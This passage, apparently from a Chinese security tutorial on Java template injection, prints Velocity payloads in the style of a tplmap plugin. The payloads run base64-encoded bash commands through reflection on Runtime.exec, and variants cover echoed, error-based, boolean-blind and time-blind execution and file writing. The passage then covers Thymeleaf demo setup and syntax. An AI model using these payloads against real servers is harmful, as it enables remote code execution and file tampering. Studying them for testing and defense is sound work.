class="hljs-string">&#x27;#set($o=1.0)#if($o.equals(0.1))#include(&quot;Y:/A:/xxx&quot;)#end&#x27;</span>,<br>                <span class="hljs-string">&#x27;verify_bool_false&#x27;</span>: <span class="hljs-string">&#x27;#set($o=1.0)#if($o.equals(1.0))#include(&quot;Y:/A:/xxx&quot;)#end&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;execute&#x27;</span>: &#123;<br>                <span class="hljs-comment"># This payload comes from henshin&#x27;s contribution on</span><br>                <span class="hljs-comment"># issue #9.</span><br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;render&#x27;</span>,<br>                <span class="hljs-string">&#x27;execute&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;#set($engine=&quot;&quot;)\</span><br><span class="hljs-string">#set($run=$engine.getClass().forName(&quot;java.lang.Runtime&quot;))\</span><br><span class="hljs-string">#set($runtime=$run.getRuntime())\</span><br><span class="hljs-string">#set($proc=$runtime.exec(&quot;bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;))\</span><br><span class="hljs-string">#set($null=$proc.waitFor())\</span><br><span class="hljs-string">#set($istr=$proc.getInputStream())\</span><br><span class="hljs-string">#set($chr=$engine.getClass().forName(&quot;java.lang.Character&quot;))\</span><br><span class="hljs-string">#set($output=&quot;&quot;)\</span><br><span class="hljs-string">#set($string=$engine.getClass().forName(&quot;java.lang.String&quot;))\</span><br><span class="hljs-string">#foreach($i in [1..$istr.available()])\</span><br><span class="hljs-string">#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\</span><br><span class="hljs-string">#end\</span><br><span class="hljs-string">$&#123;&#123;output&#125;&#125;\</span><br><span class="hljs-string">&quot;&quot;&quot;</span> <br>            &#125;,<br>            <span class="hljs-string">&#x27;execute_error&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;render&#x27;</span>,<br>                <span class="hljs-string">&#x27;execute&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;#set($engine=&quot;&quot;)\</span><br><span class="hljs-string">#set($run=$engine.getClass().forName(&quot;java.lang.Runtime&quot;))\</span><br><span class="hljs-string">#set($runtime=$run.getRuntime())\</span><br><span class="hljs-string">#set($proc=$runtime.exec(&quot;bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;))\</span><br><span class="hljs-string">#set($null=$proc.waitFor())\</span><br><span class="hljs-string">#set($istr=$proc.getInputStream())\</span><br><span class="hljs-string">#set($chr=$engine.getClass().forName(&quot;java.lang.Character&quot;))\</span><br><span class="hljs-string">#set($b=&quot;&quot;)\</span><br><span class="hljs-string">#set($string=$engine.getClass().forName(&quot;java.lang.String&quot;))\</span><br><span class="hljs-string">#foreach($i in [1..$istr.available()])\</span><br><span class="hljs-string">#set($b=$b.concat($string.valueOf($chr.toChars($istr.read()))))\</span><br><span class="hljs-string">#end\</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;execute_boolean&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;inject&#x27;</span>,<br>                <span class="hljs-string">&#x27;execute_blind&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;#set($engine=&quot;&quot;)\</span><br><span class="hljs-string">#set($run=$engine.getClass().forName(&quot;java.lang.Runtime&quot;))\</span><br><span class="hljs-string">#set($runtime=$run.getRuntime())\</span><br><span class="hljs-string">#set($proc=$runtime.exec(&quot;bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;))\</span><br><span class="hljs-string">#set($null=$proc.waitFor())\</span><br><span class="hljs-string">#set($res=$proc.exitValue())\</span><br><span class="hljs-string">#if($res != 0)#include(&quot;Y:/A:/xxx&quot;)#end\</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;execute_blind&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;inject&#x27;</span>,<br>                <span class="hljs-string">&#x27;execute_blind&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;#set($engine=&quot;&quot;)\</span><br><span class="hljs-string">#set($run=$engine.getClass().forName(&quot;java.lang.Runtime&quot;))\</span><br><span class="hljs-string">#set($runtime=$run.getRuntime())\</span><br><span class="hljs-string">#set($proc=$runtime.exec(&quot;bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&amp;&amp;&#123;&#123;sleep,&#123;delay&#125;&#125;&#125;&quot;))\</span><br><span class="hljs-string">#set($null=$proc.waitFor())\</span><br><span class="hljs-string">#set($istr=$proc.getInputStream())\</span><br><span class="hljs-string">#set($chr=$engine.getClass().forName(&quot;java.lang.Character&quot;))\</span><br><span class="hljs-string">#set($output=&quot;&quot;)\</span><br><span class="hljs-string">#set($string=$engine.getClass().forName(&quot;java.lang.String&quot;))\</span><br><span class="hljs-string">#foreach($i in [1..$istr.available()])\</span><br><span class="hljs-string">#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\</span><br><span class="hljs-string">#end\</span><br><span class="hljs-string">$&#123;&#123;output&#125;&#125;\</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;write&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;inject&#x27;</span>,<br>                <span class="hljs-string">&#x27;write&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;#set($engine=&quot;&quot;)\</span><br><span class="hljs-string">#set($run=$engine.getClass().forName(&quot;java.lang.Runtime&quot;))\</span><br><span class="hljs-string">#set($runtime=$run.getRuntime())\</span><br><span class="hljs-string">#set($proc=$runtime.exec(&quot;bash -c &#123;&#123;tr,_-,/+&#125;&#125;&lt;&lt;&lt;&#123;chunk_b64&#125;|&#123;&#123;base64,-d&#125;&#125;&gt;&gt;&#123;path&#125;&quot;))\</span><br><span class="hljs-string">#set($null=$proc.waitFor())\</span><br><span class="hljs-string">#set($istr=$proc.getInputStream())\</span><br><span class="hljs-string">#set($chr=$engine.getClass().forName(&quot;java.lang.Character&quot;))\</span><br><span class="hljs-string">#set($output=&quot;&quot;)\</span><br><span class="hljs-string">#set($string=$engine.getClass().forName(&quot;java.lang.String&quot;))\</span><br><span class="hljs-string">#foreach($i in [1..$istr.available()])\</span><br><span class="hljs-string">#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\</span><br><span class="hljs-string">#end\</span><br><span class="hljs-string">$&#123;&#123;output&#125;&#125;\</span><br><span class="hljs-string">&quot;&quot;&quot;</span>,<br>                <span class="hljs-string">&#x27;truncate&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;#set($engine=&quot;&quot;)\</span><br><span class="hljs-string">#set($run=$engine.getClass().forName(&quot;java.lang.Runtime&quot;))\</span><br><span class="hljs-string">#set($runtime=$run.getRuntime())\</span><br><span class="hljs-string">#set($proc=$runtime.exec(&quot;bash -c &#123;&#123;echo,-n,&#125;&#125;&gt;&#123;path&#125;&quot;))\</span><br><span class="hljs-string">#set($null=$proc.waitFor())\</span><br><span class="hljs-string">#set($istr=$proc.getInputStream())\</span><br><span class="hljs-string">#set($chr=$engine.getClass().forName(&quot;java.lang.Character&quot;))\</span><br><span class="hljs-string">#set($output=&quot;&quot;)\</span><br><span class="hljs-string">#set($string=$engine.getClass().forName(&quot;java.lang.String&quot;))\</span><br><span class="hljs-string">#foreach($i in [1..$istr.available()])\</span><br><span class="hljs-string">#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\</span><br><span class="hljs-string">#end\</span><br><span class="hljs-string">$&#123;&#123;output&#125;&#125;\</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            &#125;,<br>        &#125;)<br><br>        self.set_contexts([<br>                <span class="hljs-comment"># Text context, no closures</span><br>                &#123;<span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-number">0</span>&#125;,<br>                &#123;<span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;prefix&#x27;</span>: <span class="hljs-string">&#x27;&#123;closure&#125;)&#x27;</span>, <span class="hljs-string">&#x27;suffix&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;closures&#x27;</span>: java.ctx_closures&#125;,<br>                <span class="hljs-comment"># This catches</span><br>                <span class="hljs-comment"># #if(%s == 1)\n#end</span><br>                <span class="hljs-comment"># #foreach($item in %s)\n#end</span><br>                <span class="hljs-comment"># #define( %s )a#end</span><br>                &#123;<span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;prefix&#x27;</span>: <span class="hljs-string">&#x27;&#123;closure&#125;#end#if(1==1)&#x27;</span>, <span class="hljs-string">&#x27;suffix&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;closures&#x27;</span>: java.ctx_closures&#125;,<br>                &#123;<span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;prefix&#x27;</span>: <span class="hljs-string">&#x27;*#&#x27;</span>, <span class="hljs-string">&#x27;suffix&#x27;</span>: <span class="hljs-string">&#x27;#*&#x27;</span>&#125;,<br>        ])<br><br></code></pre></td></tr></table></figure>
+
+<p>render测试是否是velocity</p>
+<p><img src="/mdimg/javassti/1766471816568-4c0fc069-df17-42d4-a2a9-69dc27a0db5a.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>header拼接字符串输出</li>
+<li><code>test_render</code>: 在 body 中设置 <code>$b = rand1 * rand2</code>，为随机数乘法运算，预期返回乘积</li>
+<li><code>test_render_expected</code>: 同样是预期的乘积。</li>
+</ul>
+<p>render_error报错探测</p>
+<p><img src="/mdimg/javassti/1766471986954-1f1def76-974a-46e3-a633-5d39d0ed95b3.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><code>trailer</code>: 构造一个非法路径 <code>Y:/A:/...</code> 并调用 <code>#include($r)</code>，这会因文件不存在而抛出异常，异常信息中可能包含 <code>$h+$b+$t</code> 的拼接内容（其中 <code>$b</code> 是 body 中设置的输出）。</li>
+<li><code>test_render</code>: 在 body 中设置 <code>$b = rand1 * rand2</code>。</li>
+<li><code>test_render_expected</code>: 同样是预期的乘积。</li>
+</ul>
+<p>boolen布尔盲注，在完全无回显且无错误泄露时，通过响应时间或状态码差异进行逐位探测。</p>
+<p><img src="/mdimg/javassti/1766472082276-f2677d01-d937-4679-b72c-dea3a0147842.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><code>test_bool_true/false</code>: 利用 <code>#if</code> 条件判断 + <code>#include(&quot;Y:/A:/xxx&quot;)</code> 触发错误，根据回显差异判断</li>
+<li><code>verify_bool_*</code>: 用 <code>1.0.equals(0.1/1.0)</code> 测试浮点比较是否可靠（避免整数优化干扰）。</li>
+</ul>
+<p>execute 有回显命令执行</p>
+<p><img src="/mdimg/javassti/1766472266987-a83e6f2d-3595-47ae-9118-d6b90a673a7a.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>使用 Java 反射调用 <code>Runtime.getRuntime().exec()</code>。</li>
+<li>命令被 base64 编码，并通过 <code>tr &#39;+/&#39; &#39;_-&#39;</code> 转换为 URL-safe 字符（避免模板解析问题）。</li>
+<li>执行 <code>bash -c &#39;eval $(echo ... | base64 -d)&#39;</code> 解码并运行。</li>
+<li>读取 <code>InputStream</code> 逐字符拼接输出（因 Velocity 不支持直接 toString 流）。</li>
+<li>最终 <code>$&#123;output&#125;</code> 回显结果。</li>
+</ul>
+<p>execute_error 通过报错回显</p>
+<p><img src="/mdimg/javassti/1766472310006-215c6050-4ac5-4fc1-9b15-6b3c9f713590.png" srcset="/img/loading.gif" lazyload></p>
+<p>execute_boolean 命令执行布尔盲注（基于退出码判断0执行成功/非0执行失败）</p>
+<p><img src="/mdimg/javassti/1766472379712-16d5fa63-efa4-4ef1-ad5b-04543c56c13e.png" srcset="/img/loading.gif" lazyload></p>
+<p>execute_blind 延时盲注，通过响应时间判断命令执行结果</p>
+<p><img src="/mdimg/javassti/1766472463590-d8596dfe-7891-4d67-9fca-909d103a7a5d.png" srcset="/img/loading.gif" lazyload></p>
+<p>write 写文件</p>
+<p><img src="/mdimg/javassti/1766472567805-34ff4c5a-8cf6-4344-b330-625c642ae220.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><p><a target="_blank" rel="noopener" href="https://www.thymeleaf.org/">https://www.thymeleaf.org/</a></p>
+<h3 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h3><p>pom</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br>    &lt;parent&gt;<br>        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;<br>        &lt;version&gt;<span class="hljs-number">2.4</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>        &lt;relativePath/&gt; &lt;!-- lookup parent <span class="hljs-keyword">from</span> repository --&gt;<br>    &lt;/parent&gt;<br>    &lt;groupId&gt;org.example&lt;/groupId&gt;<br>    &lt;artifactId&gt;ssti&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">0.0</span><span class="hljs-number">.1</span>-SNAPSHOT&lt;/version&gt;<br>    &lt;name&gt;ssti&lt;/name&gt;<br>    &lt;description&gt;ssti&lt;/description&gt;<br>    &lt;url/&gt;<br>    &lt;licenses&gt;<br>        &lt;license/&gt;<br>    &lt;/licenses&gt;<br>    &lt;developers&gt;<br>        &lt;developer/&gt;<br>    &lt;/developers&gt;<br>    &lt;scm&gt;<br>        &lt;connection/&gt;<br>        &lt;developerConnection/&gt;<br>        &lt;tag/&gt;<br>        &lt;url/&gt;<br>    &lt;/scm&gt;<br>    &lt;properties&gt;<br>        &lt;java.version&gt;<span class="hljs-number">11</span>&lt;/java.version&gt;<br>    &lt;/properties&gt;<br>    &lt;dependencies&gt;<br><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;<br>        &lt;/dependency&gt;<br><br><br>    &lt;/dependencies&gt;<br><br>&lt;!--    &lt;build&gt;--&gt;<br>&lt;!--        &lt;plugins&gt;--&gt;<br>&lt;!--            &lt;plugin&gt;--&gt;<br>&lt;!--                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;<br>&lt;!--                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;--&gt;<br>&lt;!--            &lt;/plugin&gt;--&gt;<br>&lt;!--        &lt;/plugins&gt;--&gt;<br>&lt;!--    &lt;/build&gt;--&gt;<br><br>&lt;/project&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>index.html</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;!DOCTYPE html&gt;<br>&lt;html xmlns:th=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Thymeleaf Demo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 th:text=<span class="hljs-string">&quot;$&#123;message&#125;&quot;</span>&gt;Default message&lt;/h1&gt;<br>&lt;p&gt;This <span class="hljs-keyword">is</span> a Thymeleaf template.&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">package org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><br><br><br><span class="hljs-meta">@Controller</span><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br><span class="hljs-meta">    @GetMapping(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br>    public String index(Model model) &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Hello from Thymeleaf!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>; // 对应 templates/index.html<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766474438681-9975ed3b-ede7-4e23-9ecb-c092231673bb.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="语法和指令-1"><a href="#语法和指令-1" class="headerlink" title="语法和指令"></a>语法和指令</h3><h4 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h4><table>
+<thead>
+<tr>
+<th>变量表达式</th>
+<th><code>$&#123;...&#125;</code></th>
+<th>访问上下文变量（如 Model 中的数据）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>选择表达式</td>
+<td><code>*&#123;...&#125;</code></td>
+<td>针对已选定对象（通常配合 <code>th:object</code>）</td>
+</tr>
+<tr>
+<td>消息表达式</td>
+<td><code>#&#123;...&#125;</code></td>
+<td>国际化消息（i18n）</td>
+</tr>
+<tr>
+<td>链接表达式</td>
+<td><code>@&#123;...&#125;</code></td>
+<td>构建 URL（支持参数、协议、相对路径等）</td>
+</tr>
+<tr>
+<td>片段表达式</td>
+<td><code>~&#123;...&#125;</code></td>
+<td>引用模板片段（用于 <code>th:insert</code>, <code>th:replace</code>）</td>
+</tr>
+</tbody></table>
+<ol>
+<li>变量表达式 <code>$&#123;...&#125;</code></li>
+</ol>
+<p>用于访问上下文中的变量（如 Controller 传入的 Model 数据）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;!-- 假设 model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>, user); --&gt;<br>&lt;p th:text=<span class="hljs-string">&quot;$&#123;user.name&#125;&quot;</span>&gt;John Doe&lt;/p&gt;<br>&lt;p th:text=<span class="hljs-string">&quot;$&#123;user.email&#125;&quot;</span>&gt;john@example.com&lt;/p&gt;<br><br>&lt;!-- 访问列表 --&gt;<br>&lt;ul&gt;<br>  &lt;li th:each=<span class="hljs-string">&quot;item : $&#123;items&#125;&quot;</span> th:text=<span class="hljs-string">&quot;$&#123;item&#125;&quot;</span>&gt;Item&lt;/li&gt;<br>&lt;/ul&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>选择表达式<code>*&#123;...&#125;</code></li>
+</ol>
+<p>用于在已通过 <code>th:object</code> 指定的对象上进行属性访问（相当于“当前对象”的快捷方式）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;<br>  &lt;p th:text=&quot;*&#123;name&#125;&quot;&gt;Name&lt;/p&gt;          &lt;!-- 等价于 $&#123;user.name&#125; --&gt;<br>  &lt;p th:text=&quot;*&#123;email&#125;&quot;&gt;Email&lt;/p&gt;        &lt;!-- 等价于 $&#123;user.email&#125; --&gt;<br>  &lt;input type=&quot;text&quot; th:field=&quot;*&#123;age&#125;&quot; /&gt; &lt;!-- 常用于表单绑定 --&gt;<br>&lt;/div&gt;<br><br>//注意：*&#123;...&#125; 必须在 th:object 作用域内使用，否则会报错。<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>消息表达式<code>#&#123;...&#125;</code></li>
+</ol>
+<p>用于国际化（i18n），从 message properties 文件中读取对应语言的消息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!-- messages.properties: welcome.message=Hello, &#123;0&#125;! --&gt;<br>&lt;span th:text=&quot;#&#123;welcome.message($&#123;user.name&#125;)&#125;&quot;&gt;Welcome!&lt;/span&gt;<br><br>&lt;!-- 无参数 --&gt;<br>&lt;h1 th:text=&quot;#&#123;page.title&#125;&quot;&gt;Home&lt;/h1&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>链接表达式<code>@&#123;...&#125;</code></li>
+</ol>
+<p>用于构建 URL，支持相对/绝对路径、参数、协议等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!-- 基本 URL --&gt;<br>&lt;a th:href=&quot;@&#123;/home&#125;&quot;&gt;Home&lt;/a&gt;<br><br>&lt;!-- 带参数 --&gt;<br>&lt;a th:href=&quot;@&#123;/user/profile(id=$&#123;userId&#125;, tab=&#x27;info&#x27;)&#125;&quot;&gt;Profile&lt;/a&gt;<br><br>&lt;!-- 相对路径（相对于当前页面） --&gt;<br>&lt;a th:href=&quot;@&#123;profile.html&#125;&quot;&gt;My Profile&lt;/a&gt;<br><br>&lt;!-- 绝对 URL（带协议） --&gt;<br>&lt;a th:href=&quot;@&#123;https://example.com/api(data=$&#123;token&#125;)&#125;&quot;&gt;External API&lt;/a&gt;<br><br>&lt;!-- 表单提交 --&gt;<br>&lt;form th:action=&quot;@&#123;/submit&#125;&quot; method=&quot;post&quot;&gt;<br>  ...<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>片段表达式<code>~&#123;...&#125;</code></li>
+</ol>
+<p>用于引用模板片段，常与 <code>th:insert</code>、<code>th:replace</code>、<code>th:include</code>（已弃用）配合使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!-- 定义片段 (footer.html) --&gt;<br>&lt;footer th:fragment=&quot;siteFooter&quot;&gt;<br>  &amp;copy; 2025 My Site<br>&lt;/footer&gt;<br><br>&lt;!-- 引用片段 --&gt;<br>&lt;div th:insert=&quot;~&#123;footer :: siteFooter&#125;&quot;&gt;&lt;/div&gt;<br>&lt;!-- 或简写（Thymeleaf 3+ 支持省略 ~&#123;&#125;） --&gt;<br>&lt;div th:replace=&quot;footer :: siteFooter&quot;&gt;&lt;/div&gt;<br><br>&lt;!-- 传递参数给片段 --&gt;<br>&lt;div th:replace=&quot;components :: alert(type=&#x27;success&#x27;, message=#&#123;operation.success&#125;)&quot;&gt;&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p>格式<code>**th:***</code></p>
+<ol>
+<li><code>th:text</code></li>
+</ol>
+<p>替换元素的文本内容（自动转义 HTML 特殊字符）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;p th:text=&quot;$&#123;user.name&#125;&quot;&gt;Default Name&lt;/p&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><code>th:utext</code>（Unescaped Text）</li>
+</ol>
+<p>替换元素的文本内容，<strong>不转义 HTML</strong>（用于渲染富文本）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">html<br><br>预览<br><br><br><br>&lt;div th:utext=&quot;$&#123;article.content&#125;&quot;&gt;Raw HTML here&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><code>th:attr</code></li>
+</ol>
+<p>动态设置任意 HTML 属性（可一次设置多个）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img th:attr=&quot;src=$&#123;imageUrl&#125;, title=$&#123;imageTitle&#125;, alt=$&#123;imageAlt&#125;&quot; /&gt;<br></code></pre></td></tr></table></figure>
+
+<p>更推荐使用专用属性指令（如 <code>th:src</code>），除非需要动态属性名。</p>
+<p>这些是 <code>th:attr</code> 的快捷方式，更清晰安全：</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>th:src</code></td>
+<td>设置 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code> 的 <code>src</code></td>
+</tr>
+<tr>
+<td><code>th:href</code></td>
+<td>设置 <code>&lt;a&gt;</code>, <code>&lt;link&gt;</code> 的 <code>href</code></td>
+</tr>
+<tr>
+<td><code>th:value</code></td>
+<td>设置 <code>&lt;input&gt;</code>, <code>&lt;option&gt;</code> 的 <code>value</code></td>
+</tr>
+<tr>
+<td><code>th:title</code></td>
+<td>设置 <code>title</code>属性</td>
+</tr>
+<tr>
+<td><code>th:id</code></td>
+<td>设置 <code>id</code></td>
+</tr>
+<tr>
+<td><code>th:class</code></td>
+<td>设置 <code>class</code>（会覆盖原 class）</td>
+</tr>
+<tr>
+<td><code>th:style</code></td>
+<td>设置 <code>style</code></td>
+</tr>
+<tr>
